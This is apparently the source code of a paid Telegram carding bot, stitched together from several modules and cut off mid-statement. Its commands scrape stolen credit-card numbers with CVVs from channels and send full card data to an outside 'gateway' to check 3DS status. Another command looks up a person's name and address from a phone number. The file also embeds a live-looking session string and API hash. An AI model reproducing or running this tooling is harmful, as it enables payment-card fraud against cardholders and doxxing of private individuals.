from pyrogram.errors import FloodWait, AuthKeyUnregistered, UsernameInvalid

# ----------------- Database Integration -----------------
# Make sure your 'db.py' has these async functions: init_db, get_user, update_user
from db import init_db, get_user, update_user

async def check_authorization(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    """
    Private chats: only OWNER_ID or users with an active paid plan can use.
    Authorized chats (groups/channels): free for everyone.
    Other groups: only OWNER_ID or users with an active paid plan can use.
    """
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    chat_type = update.effective_chat.type

    # ✅ Owner bypass
    if user_id == OWNER_ID:
        return True

    # ✅ Free access in authorized chats
    if chat_id in AUTHORIZED_CHATS:
        return True

    # ✅ Everywhere else requires active paid plan
    if not await has_active_paid_plan(user_id):
        await update.effective_message.reply_text(
            escape_markdown(
                "🚫 You need an *active paid plan* to use this command.\n"
                "💳 Or use for free in our authorized group.",
                version=2,
            ),
            parse_mode=ParseMode.MARKDOWN_V2,
        )
        return False

    return True


async def consume_credit(user_id: int) -> bool:
    """
    Consume 1 credit from the user's account.
    Returns True if successful, False if user has no credits.
    """
    try:
        user_data = await get_user(user_id)
        if user_data and user_data.get("credits", 0) > 0:
            new_credits = user_data["credits"] - 1
            await update_user(user_id, credits=new_credits)
            return True
    except Exception as e:
        print(f"[consume_credit] Error updating user {user_id}: {e}")

    return False
# ----------------- Pyrogram Setup -----------------
import re
import asyncio
import logging
from datetime import datetime
from pyrogram import Client
from pyrogram.errors import UsernameInvalid, PeerIdInvalid, FloodWait, AuthKeyUnregistered
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

# ----------------- Telegram / Pyrogram Setup -----------------
api_id = 17455551
api_hash = "abde39d2fad230528b2695a14102b"
session_string = "AQEKWb8ALIRT21l166ckrq35t8deqYhhsi4NliqOgpKVINeOgzRxAK1hOIBvjBDddAQAWzWVkhIBoMAJvwGHk3Zjv3-ufHQdUGwRHYEk43-C88ZKlKaNNBc6DICCt8-SVWMZENIeS8hiWrh4svQtt18i9qCKsvOccqorXzBGaLXzGAACHNIu36V5s4On43OtabMbB7JziQ0BXZG4lVVedm7OV9_7fy7HE1WBmDnI8H2zTOjkC2N3FXxlidbBPf_TxKw033zAxBXwkaz2j1Xldzwdi6zJB_OOxMezvn5BLb-UmrcpvIephhQSvUt2ElMVEhnF6LY0xMf-y7plXGnifrJxHbeJUAAAAAHraX5JAA"

pyro_client = Client(
    name="scraper_session",
    api_id=api_id,
    api_hash=api_hash,
    session_string=session_string
)

# ----------------- Globals -----------------
COOLDOWN_SECONDS = 10
MAX_SCRAP_LIMIT = 1000
user_last_scr_time = {}

CARD_REGEX = re.compile(r'\b(\d[ -]*?){13,16}\|(\d{2})\|(\d{2,4})\|(\d{3,4})\b', re.IGNORECASE)
BULLET_GROUP_LINK = "https://t.me/CARDER33"
DEVELOPER_LINK = "[kคli liຖนxx](tg://resolve?domain=Kalinuxxx)"

logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s')

# ----------------- Helper Functions -----------------
def safe_md(text: str) -> str:
    if not text:
        return ""
    return re.sub(r'([_*\[\]()~`>#+\-=|{}.!])', r'\\\1', str(text))

async def consume_credit(user_id: int) -> bool:
    # Implement your DB credit check here
    return True

async def scrap_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    now = datetime.now()

    # Cooldown check
    last_time = user_last_scr_time.get(user_id)
    if last_time and (now - last_time).total_seconds() < COOLDOWN_SECONDS:
        remaining = int(COOLDOWN_SECONDS - (now - last_time).total_seconds())
        await update.message.reply_text(f"⚠️ Please wait {remaining}s before using /scr again.")
        return

    # Args check
    if len(context.args) < 2:
        await update.message.reply_text("⚠️ Usage: /scr [channel username] [amount]")
        return

    # Normalize username
    channel_input = context.args[0]
    if channel_input.startswith("https://t.me/"):
        channel = channel_input.split("/")[-1]
    else:
        channel = channel_input.lstrip("@").strip()

    # Amount parsing
    try:
        amount = int(context.args[1])
    except ValueError:
        await update.message.reply_text("❌ Amount must be a number.")
        return

    if amount > MAX_SCRAP_LIMIT:
        await update.message.reply_text(f"⚠️ Max cards per scrape: {MAX_SCRAP_LIMIT}.")
        return

    if not await consume_credit(user_id):
        await update.message.reply_text("❌ You have no credits left.")
        return

    # Update cooldown
    user_last_scr_time[user_id] = now

    # Initial progress message
    progress_msg = await update.message.reply_text(
        f"⚡ Scraping {amount} cards from @{channel}, please wait…",
        parse_mode=ParseMode.MARKDOWN_V2
    )

    # Start background scraping
    asyncio.create_task(scrap_cards_background(channel, amount, user_id, chat_id, context.bot, progress_msg, update.message.message_id))

import asyncio
import logging
from telegram.constants import ParseMode
from telegram.helpers import escape_markdown

# Utility function to safely escape text for MarkdownV2
def safe_md(text: str) -> str:
    if not text:
        return ""
    return escape_markdown(str(text), version=2)

async def scrap_cards_background(channel, amount, user_id, chat_id, bot, progress_msg, reply_to_message_id):
    logging.info("Scrape started: channel=%s, amount=%s, user_id=%s", channel, amount, user_id)
    cards = []
    seen = set()

    try:
        # Make sure client is connected
        if not pyro_client.is_connected:
            await pyro_client.start()

        # Verify channel access
        try:
            chat = await pyro_client.get_chat(channel)
        except (UsernameInvalid, PeerIdInvalid):
            await bot.send_message(chat_id, f"❌ Invalid channel @{channel}", reply_to_message_id=reply_to_message_id)
            return
        except Exception:
            await bot.send_message(chat_id, f"❌ Cannot access @{channel}", reply_to_message_id=reply_to_message_id)
            return

        # Scrape messages
        count = 0
        async for message in pyro_client.get_chat_history(channel, limit=amount*20):
            text = message.text or message.caption or ""
            for match in CARD_REGEX.finditer(text):
                card_string = match.group(0)
                if card_string not in seen:
                    seen.add(card_string)
                    cards.append(card_string)
                    count += 1
                if count >= amount:
                    break
            if count >= amount:
                break
            await asyncio.sleep(0.05)

        if not cards:
            await progress_msg.edit_text("❌ No valid cards found.")
            return

        # Save to file
        filename = "CVX_Scrapped.txt"
        with open(filename, "w") as f:
            f.write("\n".join(cards[:amount]))

        await progress_msg.delete()

        # Prepare caption safely
        user = await bot.get_chat(user_id)
        requester = f"@{user.username}" if user.username else str(user_id)
        requester_escaped = safe_md(requester)
        channel_escaped = safe_md(channel)
        bullet_text = safe_md("[⌇]")
        bullet_link = f"[{bullet_text}]({safe_md(BULLET_GROUP_LINK)})"
        developer_link_escaped = safe_md(DEVELOPER_LINK)

        caption = (
            f"✦━━━━━━━━━━━━━━✦\n"
            f"{bullet_link} 𝗦ᴄʀᴀᴘᴘᴇᴅ 𝗖ᴀʀᴅs💎\n"
            f"{bullet_link} 𝐂𝐡𝐚ɴɴᴇʟ: @{channel_escaped}\n"
            f"{bullet_link} 𝐓ᴏᴛᴀʟ 𝐂ᴀʀᴅs: {len(cards[:amount])}\n"
            f"{bullet_link} 𝐑ᴇQᴜᴇsᴛᴇᴅ 𝐛ʏ: {requester_escaped}\n"
            f"{bullet_link} 𝐃ᴇᴠᴇʟᴏᴘᴇʀ: {developer_link_escaped}\n"
            f"✦━━━━━━━━━━━━━━✦"
        )

        # Send the document
        with open(filename, "rb") as f:
            await bot.send_document(
                chat_id=chat_id,
                document=f,
                caption=caption,
                parse_mode=ParseMode.MARKDOWN_V2,
                reply_to_message_id=reply_to_message_id
            )

    except FloodWait as e:
        await bot.send_message(chat_id, f"❌ FloodWait: {e.value}s", reply_to_message_id=reply_to_message_id)
    except AuthKeyUnregistered:
        await bot.send_message(chat_id, "❌ Session string invalid. Get a new one.", reply_to_message_id=reply_to_message_id)
    except Exception as e:
        await bot.send_message(
            chat_id,
            f"❌ Unexpected error: {safe_md(str(e))}",
            parse_mode=ParseMode.MARKDOWN_V2,
            reply_to_message_id=reply_to_message_id
        )
        logging.exception("Unexpected error")




# --- Imports ---
import aiohttp
import asyncio
import logging
from datetime import datetime, timedelta
from telegram import Update
from telegram.ext import ContextTypes
from bin import get_bin_info

# --- Local Imports ---
from db import get_user, update_user  # assuming you have these functions

# --- Constants ---
BULLET_GROUP_LINK = "https://t.me/CARDER33"
bullet_text = "[⌇]"
bullet_link = f'<a href="{BULLET_GROUP_LINK}">{bullet_text}</a>'

DEVELOPER_NAME = "kคli liຖนxx"
DEVELOPER_LINK = "https://t.me/Kalinuxxx"
developer_clickable = f"<a href='{DEVELOPER_LINK}'>{DEVELOPER_NAME}</a>"

logger = logging.getLogger(__name__)

# --- Cooldown tracking ---
user_cooldowns = {}  # user_id: datetime of last command
COOLDOWN_SECONDS = 5

# --- Credit System ---
async def consume_credit(user_id: int) -> bool:
    try:
        user_data = await get_user(user_id)
        if user_data and user_data.get("credits", 0) > 0:
            new_credits = user_data["credits"] - 1
            await update_user(user_id, credits=new_credits)
            return True
    except Exception as e:
        logger.warning(f"[consume_credit] Error updating user {user_id}: {e}")
    return False

# --- /vbv command ---
import re
import asyncio
from datetime import datetime, timedelta, timezone
from telegram import Update
from telegram.ext import ContextTypes

async def vbv(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    # Current UTC time (timezone-aware)
    now = datetime.now(timezone.utc)

    # Check cooldown
    last_time = user_cooldowns.get(user_id)
    if last_time:
        # Convert float timestamp to datetime if needed
        if isinstance(last_time, float):
            last_time_dt = datetime.fromtimestamp(last_time, tz=timezone.utc)
        else:
            last_time_dt = last_time

        if now - last_time_dt < timedelta(seconds=COOLDOWN_SECONDS):
            remaining = COOLDOWN_SECONDS - int((now - last_time_dt).total_seconds())
            await update.message.reply_text(
                f"⏳ Please wait {remaining}s before using /vbv again."
            )
            return

    # Check credits
    if not await consume_credit(user_id):
        await update.message.reply_text("❌ You don’t have enough credits to use /vbv.")
        return

    card_data = None

    # 1️⃣ Check if card is provided as argument
    if context.args:
        card_data = context.args[0].strip()

    # 2️⃣ Check if this is a reply to a message
    elif update.message.reply_to_message and update.message.reply_to_message.text:
        # Extract card-like pattern from reply
        match = re.search(r"(\d{12,19}\|\d{2}\|\d{2,4}\|\d{3,4})", update.message.reply_to_message.text)
        if match:
            card_data = match.group(1).strip()

    if not card_data:
        await update.message.reply_text(
            "⚠️ Usage: /vbv <card|mm|yyyy|cvv>\n"
            "Or reply to a message containing a card in `number|mm|yy(yy)|cvv` format."
        )
        return

    # Send processing message
    msg = await update.message.reply_text("<b>⏳ Processing your request...</b>", parse_mode="HTML")

    # Update cooldown (store as timestamp)
    user_cooldowns[user_id] = now.timestamp()

    # Run background VBV check
    asyncio.create_task(run_vbv_check(msg, update, card_data))
# --- Background worker ---
import aiohttp
import asyncio
import html
import logging

# Assuming bullet_link, developer_clickable, get_bin_info are already defined
logger = logging.getLogger(__name__)

async def run_vbv_check(msg, update, card_data: str):
    try:
        cc, mes, ano, cvv = card_data.split("|")
    except ValueError:
        await msg.edit_text("❌ Invalid format. Use: /vbv 4111111111111111|07|2027|123")
        return

    bin_number = cc[:6]
    api_url = f"https://rocky-815m.onrender.com/gateway=bin?key=Payal&card={card_data}"

    # Fetch VBV data
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, timeout=50) as resp:
                if resp.status != 200:
                    await msg.edit_text(f"❌ API Error (Status {resp.status}). Try again later.")
                    return
                vbv_data = await resp.json(content_type=None)
    except asyncio.TimeoutError:
        await msg.edit_text("❌ API request failed: Timed out ⏳")
        return
    except aiohttp.ClientConnectorError:
        await msg.edit_text("❌ API request failed: Cannot connect to host 🌐")
        return
    except aiohttp.ContentTypeError:
        await msg.edit_text("❌ API request failed: Invalid JSON response 📄")
        return
    except Exception as e:
        await msg.edit_text(f"❌ API request failed: {type(e).__name__} → {e}")
        return

    # BIN lookup
    try:
        bin_details = await get_bin_info(bin_number)
        brand = (bin_details.get("scheme") or "N/A").title()
        issuer = bin_details.get("bank") or "N/A"
        country_name = bin_details.get("country") or "Unknown"
        country_flag = bin_details.get("country_emoji", "")
        card_type = bin_details.get("type", "N/A")
        card_level = bin_details.get("brand", "N/A")
        card_length = bin_details.get("length", "N/A")
        luhn_check = bin_details.get("luhn", "N/A")
        bank_phone = bin_details.get("bank_phone", "N/A")
        bank_url = bin_details.get("bank_url", "N/A")
    except Exception as e:
        logger.warning(f"BIN lookup failed for {bin_number}: {e}")
        brand = issuer = card_type = card_level = card_length = luhn_check = bank_phone = bank_url = "N/A"
        country_name = "Unknown"
        country_flag = ""

    # Response formatting
    response_text = vbv_data.get("response", "N/A")
    check_mark = "✅" if response_text.lower().find("successful") != -1 else "❌"

    # Escape HTML to prevent formatting issues
    safe_card = html.escape(card_data)
    safe_reason = html.escape(response_text)
    safe_brand = html.escape(brand)
    safe_issuer = html.escape(issuer)
    safe_country = html.escape(f"{country_name} {country_flag}".strip())

    text = (
        "═══[ #𝟯𝗗𝗦 𝗟𝗼𝗼𝗸𝘂𝗽 ]═══\n"
        f"{bullet_link} 𝐂𝐚𝐫𝐝 ➜ <code>{safe_card}</code>\n"
        f"{bullet_link} BIN ➜ <code>{bin_number}</code>\n"
        f"{bullet_link} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➜ <i>{safe_reason} {check_mark}</i>\n"
        "――――――――――――――――\n"
        f"{bullet_link} 𝐁𝐫𝐚𝐧𝐝 ➜ <code>{safe_brand}</code>\n"
        f"{bullet_link} 𝐁𝐚𝐧𝐤 ➜ <code>{safe_issuer}</code>\n"
        f"{bullet_link} 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➜ <code>{safe_country}</code>\n"
        "――――――――――――――――\n"
        f"{bullet_link} 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➜ {update.effective_user.mention_html()}\n"
        f"{bullet_link} 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 ➜ {developer_clickable}"
    )

    await msg.edit_text(text, parse_mode="HTML", disable_web_page_preview=True)


from telegram import Update
from telegram.ext import ContextTypes
import aiohttp
import json
from db import get_user, update_user

NUM_API = "https://e1e63696f2d5.ngrok-free.app/index.cpp?key=dark&number={number}"

async def consume_credit(user_id: int, amount: int = 1) -> bool:
    """Consume `amount` credits from DB user if available."""
    user_data = await get_user(user_id)
    if user_data and user_data.get("credits", 0) >= amount:
        new_credits = user_data["credits"] - amount
        await update_user(user_id, credits=new_credits)
        return True
    return False

async def num_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    # Validate input
    if len(context.args) != 1 or not context.args[0].isdigit() or len(context.args[0]) != 10:
        await update.message.reply_text("❌ Usage: /num <code>10-digit number</code>", parse_mode="HTML")
        return

    number = context.args[0]

    # Check credits before proceeding
    user_data = await get_user(user_id)
    if not user_data or user_data.get("credits", 0) < 5:
        await update.message.reply_text("❌ You need at least 5 credits to use this command.")
        return

    # Send initial "Checking number" message
    msg = await update.message.reply_text(
        f"🔎 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 𝐧𝐮𝐦𝐛𝐞𝐫: <code>{number}</code>",
        parse_mode="HTML"
    )

    try:
        # Fetch data from API
        async with aiohttp.ClientSession() as session:
            async with session.get(NUM_API.format(number=number), timeout=30) as resp:
                text = await resp.text()
                data = json.loads(text)

        entries = data.get("data", [])
        if not entries:
            await msg.edit_text("❌ No data found for this number.")
            return

        # Consume 5 credits after successful fetch
        await consume_credit(user_id, amount=5)

        # Build message content
        msg_lines = [
            "✦━━━━━━━━━━━━━━✦",
            "     ⚡ 𝑪𝑨𝑹𝐃 ✘ 𝑪𝑯𝑲",
            "✦━━━━━━━━━━━━━━✦\n"
        ]

        # Format each entry
        for idx, item in enumerate(entries, 1):
            msg_lines.append(f"<pre><code>📌 Entry {idx}:</code></pre>")
            msg_lines.append(f"   👤 𝐍𝐚𝐦𝐞    : <code>{item.get('name', 'N/A')}</code>")
            msg_lines.append(f"   👨‍🎤 𝐅𝐍𝐚𝐦𝐞   : <code>{item.get('fname', 'N/A')}</code>")
            msg_lines.append(f"   📍 𝐀𝐝𝐝𝐫𝐞𝐬𝐬 : <code>{item.get('address', 'N/A')}</code>")
            msg_lines.append(f"   🌐 𝐂𝐢𝐫𝐜𝐥𝐞  : <code>{item.get('circle', 'N/A')}</code>")
            msg_lines.append(f"   📱 𝐌𝐨𝐛𝐢𝐥𝐞  : <code>{item.get('mobile', 'N/A')}</code>")
            msg_lines.append(f"   🆔 𝐈𝐃      : <code>{item.get('id', 'N/A')}</code>\n")

        # Edit the original "Checking" message with full data
        msg_content = "\n".join(msg_lines)
        await msg.edit_text(msg_content, parse_mode="HTML", disable_web_page_preview=True)

    except Exception as e:
        await msg.edit_text(f"❌ Error fetching data: {str(e)}")








import psutil
import platform
import socket
from datetime import datetime
import time
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

# Clickable bullet
BULLET_LINK = '<a href="https://t.me/CARDER33">[⌇]</a>'

async def get_total_users():
    from db import get_all_users
    users = await get_all_users()
    return len(users)

def get_uptime() -> str:
    boot_time = psutil.boot_time()
    uptime_seconds = int(time.time() - boot_time)
    days, remainder = divmod(uptime_seconds, 86400)
    hours, remainder = divmod(remainder, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{days}d {hours:02}:{minutes:02}:{seconds:02}"

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # CPU info
    cpu_usage = psutil.cpu_percent(interval=1)
    cpu_count = psutil.cpu_count(logical=True)
    cpu_model = platform.processor() or "N/A"

    # RAM info
    memory = psutil.virtual_memory()
    total_memory = memory.total / (1024 ** 3)  # GB
    used_memory = memory.used / (1024 ** 3)
    available_memory = memory.available / (1024 ** 3)
    memory_percent = memory.percent

    # Disk info
    disk = psutil.disk_usage("/")
    total_disk = disk.total / (1024 ** 3)  # GB
    used_disk = disk.used / (1024 ** 3)
    free_disk = disk.free / (1024 ** 3)
    disk_percent = disk.percent

    # Host/VPS info
    hostname = socket.gethostname()
    os_name = platform.system()
    os_version = platform.version()
    architecture = platform.machine()

    # Uptime
    uptime_str = get_uptime()

    # Current time
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Total users
    total_users = await get_total_users()

    # Final message
    status_message = (
        f"✦━━━[ 𝐁𝐨𝐭 & 𝐕𝐏𝐒 𝐒𝐭𝐚𝐭𝐮𝐬 ]━━━✦\n"
        f"{BULLET_LINK} 𝐒𝐭𝐚𝐭𝐮𝐬 ➳ <code>Active ✅</code>\n"
        f"{BULLET_LINK} 𝐒𝐲𝐬𝐭𝐞𝐦 ➳ <code>{os_name} {os_version}</code>\n"
        f"{BULLET_LINK} 𝐀𝐫𝐜𝐡𝐢𝐭𝐞𝐜𝐭𝐮𝐫𝐞 ➳ <code>{architecture}</code>\n"
        "――――――――――――――――\n"
        f"{BULLET_LINK} 𝐂𝐏𝐔 𝐔𝐬𝐚𝐠𝐞 ➳ <code>{cpu_usage:.1f}% ({cpu_count} cores)</code>\n"
        f"{BULLET_LINK} 𝐑𝐀𝐌 𝐔𝐬𝐚𝐠𝐞 ➳ <code>{used_memory:.2f}GB / {total_memory:.2f}GB ({memory_percent:.1f}%)</code>\n"
        f"{BULLET_LINK} 𝐑𝐀𝐌 𝐀𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞 ➳ <code>{available_memory:.2f}GB</code>\n"
        f"{BULLET_LINK} 𝐃𝐢𝐬𝐤 𝐔𝐬𝐚𝐠𝐞 ➳ <code>{used_disk:.2f}GB / {total_disk:.2f}GB ({disk_percent:.1f}%)</code>\n"
        f"{BULLET_LINK} 𝐃𝐢𝐬𝐤 𝐀𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞 ➳ <code>{free_disk:.2f}GB</code>\n"
        "――――――――――――――――\n"
        f"{BULLET_LINK} 𝐓𝐨𝐭𝐚𝐥 𝐔𝐬𝐞𝐫𝐬 ➳ <code>{total_users}</code>\n"
        f"{BULLET_LINK} 𝐔𝐩𝐭𝐢𝐦𝐞 ➳ <code>{uptime_str}</code>\n"
        f"{BULLET_LINK} 𝐓𝐢𝐦𝐞 ➳ <code>{current_time}</code>\n"
        f"{BULLET_LINK} 𝐁𝐨𝐭 𝐁𝐲 ➳ <a href='tg://resolve?domain=Kalinuxxx'>kคli liຖนxx</a>\n"
        "――――――――――――――――"
    )

    await update.effective_message.reply_text(
        status_message,
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True
    )




# === OWNER-ONLY COMMANDS ===
import re
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

from config import AUTHORIZED_CHATS
from db import get_all_users  # Ensure this exists in db.py

def escape_markdown_v2(text: str) -> str:
    return re.sub(r'([_*\[\]()~`>#+\-=|{}.!\\])', r'\\\1', str(text))

async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Shows all admin commands, authorized groups, and private plan users."""

    admin_commands_list = (
        "• `/give_starter <user_id>`: Give 7\\-day Starter Plan\n"
        "• `/give_premium <user_id>`: Give 30\\-day Premium Plan\n"
        "• `/give_plus <user_id>`: Give 60\\-day Plus Plan\n"
        "• `/give_custom <user_id>`: Give Custom Plan\n"
        "• `/take_plan <user_id>`: Remove plan & private access\n"
        "• `/au <chat_id>`: Authorize a group\n"
        "• `/rauth <user_id>`: Remove private user auth\n"
        "• `/gen_codes`: Generate 10 Starter Plan codes"
    )

    # Authorized Groups
    authorized_groups_list = []
    for chat_id in AUTHORIZED_CHATS:
        try:
            chat = await context.bot.get_chat(chat_id)
            name = escape_markdown_v2(chat.title or "N/A")
        except Exception:
            name = "Unknown or Left Group"
        escaped_id = escape_markdown_v2(str(chat_id))
        authorized_groups_list.append(f"• `{escaped_id}` → *{name}*")
    authorized_groups_str = (
        "\n".join(authorized_groups_list) if authorized_groups_list else "_No groups authorized\\._"
    )

    # Private plan users
    users = await get_all_users()
    plan_users = []
    for user in users:
        plan = user.get("plan", "Free")
        if plan.lower() not in ["free", "n/a"]:
            uid = escape_markdown_v2(str(user["id"]))
            plan_escaped = escape_markdown_v2(plan)
            plan_users.append(f"• ID: `{uid}` \\| Plan: `{plan_escaped}`")
    authorized_users_str = (
        "\n".join(plan_users) if plan_users else "_No private users with plans\\._"
    )

    admin_dashboard_message = (
        "╭━━━━━『 𝐀𝐃𝐌𝐈𝐍 𝐃𝐀𝐒𝐇𝐁𝐎𝐀𝐑𝐃 』━━━━━╮\n"
        "┣ 🤖 *Owner Commands:*\n"
        f"{admin_commands_list}\n"
        "╭━━━『 𝐀𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 𝐆𝐫𝐨𝐮𝐩𝐬 』━━━╮\n"
        f"{authorized_groups_str}\n"
        "╭━━━『 𝐀𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 𝐔𝐬𝐞𝐫𝐬 \\(Private Plans\\) 』━━━╮\n"
        f"{authorized_users_str}"
    )

    await update.effective_message.reply_text(
        admin_dashboard_message,
        parse_mode=ParseMode.MARKDOWN_V2
    )



async def _update_user_plan(user_id: int, plan_name: str, credits: int, duration_days: int = None):
    """Updates user's subscription plan and expiry."""
    plan_expiry = 'N/A'
    if duration_days:
        expiry_date = datetime.now() + timedelta(days=duration_days)
        plan_expiry = expiry_date.strftime('%d-%m-%Y')

    await update_user(
        user_id,
        plan=plan_name,
        status=plan_name,
        credits=credits,
        plan_expiry=plan_expiry
    )

    AUTHORIZED_PRIVATE_USERS.add(user_id)

    # Re-fetch updated user data if needed
    user_data = await get_user(user_id)
    return user_data


from datetime import datetime, timedelta
from telegram.constants import ParseMode

PLAN_DEFINITIONS = {
    "starter": {"name": "Starter Plan", "credits": 300, "days": 7},
    "premium": {"name": "Premium Plan", "credits": 1000, "days": 30},
    "plus": {"name": "Plus Plan", "credits": 2000, "days": 60},
    "custom": {"name": "Custom Plan", "credits": 3000, "days": None},
}

def escape_markdown_v2(text: str) -> str:
    return re.sub(r'([_*\[\]()~`>#+\-=|{}.!\\])', r'\\\1', str(text))


from datetime import datetime

async def give_starter(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        return await update.effective_message.reply_text("🚫 You are not authorized to use this command.")

    if not context.args or not context.args[0].isdigit():
        return await update.effective_message.reply_text(
            "❌ Invalid format\\. Usage: `/give_starter [user_id]`",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    user_id = int(context.args[0])
    await _update_user_plan(user_id, 'Starter Plan', 300, 7)
    await update.effective_message.reply_text(
        f"✅ Starter Plan activated for user `{user_id}`\\.",
        parse_mode=ParseMode.MARKDOWN_V2
    )

    # Fetch user info and send congratulation
    try:
        chat = await context.bot.get_chat(user_id)
        first_name = chat.first_name or "Warrior"
    except Exception:
        first_name = "Warrior"

    date_str = datetime.now().strftime('%d %B %Y')
    congrats_text = generate_congrats_box(user_id, "Starter", "KILLER + TOOLS", date_str, first_name)

    try:
        await context.bot.send_message(
            chat_id=user_id,
            text=congrats_text,
            parse_mode=ParseMode.MARKDOWN_V2
        )
    except Exception as e:
        await update.effective_message.reply_text(f"⚠️ Failed to send congratulatory message to user `{user_id}`\\.\nError: `{e}`", parse_mode=ParseMode.MARKDOWN_V2)

from datetime import datetime

async def give_premium(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        return await update.effective_message.reply_text("🚫 You are not authorized to use this command.")

    if not context.args or not context.args[0].isdigit():
        return await update.effective_message.reply_text(
            "❌ Invalid format\\. Usage: `/give_premium [user_id]`",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    user_id = int(context.args[0])
    await _update_user_plan(user_id, 'Premium Plan', 1000, 30)
    await update.effective_message.reply_text(
        f"✅ Premium Plan activated for user `{user_id}`\\.",
        parse_mode=ParseMode.MARKDOWN_V2
    )

    # Fetch user details
    try:
        chat = await context.bot.get_chat(user_id)
        first_name = chat.first_name or "Warrior"
    except Exception:
        first_name = "Warrior"

    date_str = datetime.now().strftime('%d %B %Y')
    congrats_text = generate_congrats_box(user_id, "Premium", "KILLER + TOOLS", date_str, first_name)

    try:
        await context.bot.send_message(
            chat_id=user_id,
            text=congrats_text,
            parse_mode=ParseMode.MARKDOWN_V2
        )
    except Exception as e:
        await update.effective_message.reply_text(
            f"⚠️ Failed to send congratulatory message to user `{user_id}`\\.\nError: `{e}`",
            parse_mode=ParseMode.MARKDOWN_V2
        )


from datetime import datetime

async def give_plus(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        return await update.effective_message.reply_text("🚫 You are not authorized to use this command.")

    if not context.args or not context.args[0].isdigit():
        return await update.effective_message.reply_text(
            "❌ Invalid format\\. Usage: `/give_plus [user_id]`",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    user_id = int(context.args[0])
    await _update_user_plan(user_id, 'Plus Plan', 2000, 60)

    await update.effective_message.reply_text(
        f"✅ Plus Plan activated for user `{user_id}`\\.",
        parse_mode=ParseMode.MARKDOWN_V2
    )

    # Fetch user's name
    try:
        chat = await context.bot.get_chat(user_id)
        first_name = chat.first_name or "Warrior"
    except Exception:
        first_name = "Warrior"

    # Create and send congratulations box
    date_str = datetime.now().strftime('%d %B %Y')
    congrats_text = generate_congrats_box(user_id, "Plus", "KILLER + TOOLS", date_str, first_name)

    try:
        await context.bot.send_message(
            chat_id=user_id,
            text=congrats_text,
            parse_mode=ParseMode.MARKDOWN_V2
        )
    except Exception as e:
        await update.effective_message.reply_text(
            f"⚠️ Failed to send congratulatory message to user `{user_id}`\\.\nError: `{e}`",
            parse_mode=ParseMode.MARKDOWN_V2
        )

from datetime import datetime

async def give_custom(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        return await update.effective_message.reply_text("🚫 You are not authorized to use this command.")

    if not context.args or not context.args[0].isdigit():
        return await update.effective_message.reply_text(
            "❌ Invalid format\\. Usage: `/give_custom [user_id]`",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    user_id = int(context.args[0])
    await _update_user_plan(user_id, 'Custom Plan', 3000)

    await update.effective_message.reply_text(
        f"✅ Custom Plan activated for user `{user_id}` with 3000 credits\\.",
        parse_mode=ParseMode.MARKDOWN_V2
    )

    # Get first name for congrats message
    try:
        chat = await context.bot.get_chat(user_id)
        first_name = chat.first_name or "Warrior"
    except Exception:
        first_name = "Warrior"

    # Generate & send congratulatory message
    date_str = datetime.now().strftime('%d %B %Y')
    congrats_text = generate_congrats_box(
        user_id=user_id,
        plan="Custom",
        access_level="KILLER + TOOLS",
        date=date_str,
        first_name=first_name
    )

    try:
        await context.bot.send_message(
            chat_id=user_id,
            text=congrats_text,
            parse_mode=ParseMode.MARKDOWN_V2
        )
    except Exception as e:
        await update.effective_message.reply_text(
            f"⚠️ Failed to send congratulatory message to user `{user_id}`\\.\nError: `{e}`",
            parse_mode=ParseMode.MARKDOWN_V2
        )


async def take_plan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Removes a user's current plan and revokes private access."""
    if update.effective_user.id not in ADMIN_IDS:
        return await update.effective_message.reply_text("🚫 You are not authorized to use this command.")

    if not context.args or not context.args[0].isdigit():
        return await update.effective_message.reply_text("❌ Invalid format\\. Usage: `/take_plan [user_id]`", parse_mode=ParseMode.MARKDOWN_V2)
    
    try:
        user_id = int(context.args[0])
        user_data = await get_user(user_id)  # ✅ FIXED: was `user.id` before (wrong variable)
        
        # Reset plan and credits
        user_data['plan'] = 'Free'
        user_data['status'] = 'Free'
        user_data['plan_expiry'] = 'N/A'
        user_data['credits'] = DEFAULT_FREE_CREDITS
        
        # Persist the update
        await update_user(
            user_id,
            plan='Free',
            status='Free',
            plan_expiry='N/A',
            credits=DEFAULT_FREE_CREDITS
        )

        # Remove from private authorized users
        AUTHORIZED_PRIVATE_USERS.discard(user_id)

        await update.effective_message.reply_text(
            f"✅ Plan and private access have been removed for user `{user_id}`\\.",
